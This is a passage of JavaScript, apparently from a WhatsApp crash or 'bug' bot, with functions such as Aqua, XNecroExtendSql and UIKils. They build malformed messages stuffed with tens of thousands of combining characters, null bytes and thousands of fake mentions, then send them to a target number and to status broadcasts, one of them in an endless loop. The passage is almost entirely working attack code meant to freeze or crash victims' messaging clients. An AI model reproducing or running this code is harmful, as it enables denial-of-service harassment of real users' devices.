ྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུ?",
              body: "{ x.json }",
              mediaType: 1,
              renderLargerThumbnail: true,
              jpegThumbnail: null,
              sourceUrl: "https://example.com"
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: "{}" + "\u0000".repeat(100000)
            }
          ],
          messageParamsJson: "{}"
        }
      }
    }
  }

  const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {})

  await skid.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target })
}
async function Aqua(skid, target) {
  try {
    const msg1 = generateWAMessageFromContent(target, {
      groupInviteMessage: {
        groupJid: "120363370626418572@g.us",
        inviteCode: "SaturnXtrapas",
        inviteExpiration: "99999999999",
        groupName: "⎋SaturnMobail🌹‌‌" + "ោ៝".repeat(7777),
        caption: "ោ៝".repeat(10000) + "Waterpak".repeat(9000) + "ྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷྪྦྷྦྷཱཱཱིིུྦྷ*_*._>".repeat(5000),
        contentText: "ꦾ".repeat(9000),
        displayText: "ꦾ".repeat(9000),
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            ),
          ],
          expiration: 1,
          ephemeralSettingTimestamp: 1,
          entryPointConversionSource: "WhatsApp.com",
          entryPointConversionApp: "WhatsApp",
          entryPointConversionDelaySeconds: 1,
          disappearingMode: {
            initiatorDeviceJid: target,
            initiator: "INITIATED_BY_OTHER",
            trigger: "UNKNOWN_GROUPS",
          },
          participant: target,
          remoteJid: target,
          questionMessage: {
            paymentInviteMessage: {
              serviceType: 1,
              expiryTimestamp: null,
            },
          },
          externalAdReply: {
            showAdAttribution: false,
            renderLargerThumbnail: true,
          },
        },
        body: {
          text:
            "⎋SaturnBlenk🌹‌‌" +
            "ꦾ".repeat(10450) +
            "SaturnX Nih Bos🌹‌‌" +
            "ꦾ".repeat(10000),
        },
      },
    }, {});

    await skid.relayMessage(target, msg1.message, { messageId: msg1.key.id });
    await sleep(100);

    const msg2 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamJson: "\u0000".repeat(25000),
                },
                {
                  name: "cta_url",
                  buttonParamJson: JSON.stringify({
                    displayText: "PlerAnjeng🌹‌‌" + "ꦾ".repeat(5000),
                  }),
                },
                {
                  name: "cta_call",
                  buttonParamJson: JSON.stringify({
                    displayText: "DuelDek🌹‌‌" + "ꦾ".repeat(5000),
                  }),
                },
                {
                  name: "cta_copy",
                  buttonParamJson: "\u0000".repeat(25000),
                },
              ],
            },
            contextInfo: {
              remoteJid: target,
              participant: target,
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: skid.generateMessageTag(),
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net",
              },
            },
          },
        },
      },
    }, {});

    await skid.relayMessage(target, msg2.message, { messageId: msg2.key.id });

    const msg3Content = {
      message: {
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
          fileLength: 99999999999999,
          seconds: 99999999999999,
          ptt: true,
          mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
          fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
          directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
          mediaKeyTimestamp: 99999999999999,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
              ),
            ],
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363375427625764@newsletter",
              serverMessageId: 1,
              newsletterName: "🌹",
            },
          },
          waveform:
            "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==",
        },
      },
    };

    while (true) {
      const msg3 = generateWAMessageFromContent("status@broadcast", msg3Content, {});
      await skid.relayMessage("status@broadcast", msg3.message, {
        messageId: msg3.key.id,
      });
      await sleep(150);
    }
  } catch (err) {
    console.error("Error:", err);
  }
}
async function XNecroExtendSql(skid, target, mention) {
  for (let i = 0; i < 10; i++) {
    mention.push(
      ...Array.from(
        { length: 1900 },
        () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      ),
    );
  }
  
  const Extend = {
    extendedTextMessage: {
      text: "\u0000",
      contextInfo: {
        participant: target,
        mentionedJid: mention,
      },
    },
  };
  
  const Sticker = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
             "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, Extend, Sticker, {});

  await skid.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await skid.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
async function UIKils(sock, target, mention = true) {
  const qwerty = "https://c.top4top.io/p_3540b4q9n0.png"
  const msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
        stickerMessage: {
  url: qwerty,
  fileSha256: Buffer.from(""),
  fileEncSha256: Buffer.from(""),
  mediaKey: Buffer.from(""),
  mimetype: "image/webp",
  height: 512,
  width: 512
}, 
          interactiveMessage: {
            body: { 
              text: "You Know BokepSaturn?" + "ꦾ".repeat(100) + "b҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉